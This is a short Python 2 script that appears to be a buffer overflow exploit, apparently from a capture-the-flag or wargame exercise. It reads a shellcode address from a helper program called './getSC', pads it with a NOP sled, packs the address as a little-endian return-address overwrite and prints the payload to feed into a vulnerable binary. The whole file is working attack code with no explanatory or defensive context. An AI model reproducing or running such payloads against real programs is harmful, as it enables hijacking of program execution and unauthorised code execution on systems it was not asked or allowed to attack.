import os
from struct import *

f = os.popen("./getSC", "r")

p = lambda x : pack("<L", x)

SC_Address = f.read()
NSled = "\x90"*(56-16)

payload = ""
payload += NSled
payload += p(long(SC_Address, base = 16))

print payload